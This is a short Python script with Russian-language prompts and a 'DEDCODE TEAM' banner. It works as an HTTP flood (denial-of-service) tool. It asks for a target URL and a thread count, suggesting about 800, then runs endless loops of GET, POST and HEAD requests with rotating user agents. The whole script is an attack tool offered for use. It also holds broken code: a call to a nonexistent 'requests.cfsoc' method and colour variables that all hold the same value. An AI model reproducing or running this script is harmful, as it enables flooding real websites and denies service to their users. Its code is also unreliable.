import requests
import sys
import re
import argparse
import requests 
from threading import Thread
import random
import os
import time
# Colors
yellow='\033[92m'
cyan='\033[92m'
pink='\033[92m'
green = '\033[92m'
red ='\033[92m'
white ='\033[92m'
black ='\033[92m'
# Requests
print("head...")
users = [
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla / 5.0 (Macintosh; Intel Mac OS X 10.14; rv: 75.0) Gecko / 20100101 Firefox / 75.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
    "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
    "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0"
]
headers = {
    'User-Agent' : random.choice(users)
}

os.system("clear")
print(green + f" З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")
print("   🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼    ")

url = input("Ссылка: ")
threads = int(input("Потоки (~800 лучше): "))

payload = {
    'namest': 'username',
    'passwordst': 'password',
}
def send():
    while True:
        requests.get(url, headers=headers, data=payload)
        print("Get...")
        requests.post(url, headers=headers, data=payload)
        print("post...")
        requests.head(url, headers=headers, data=payload)
        print("head...")
        requests.cfsoc(url, headers=headers, data=payload)
        print("cfsoc...")


if __name__ == '__main__':
    for i in range (threads):
        thr = Thread(target=send)
        thr.start()
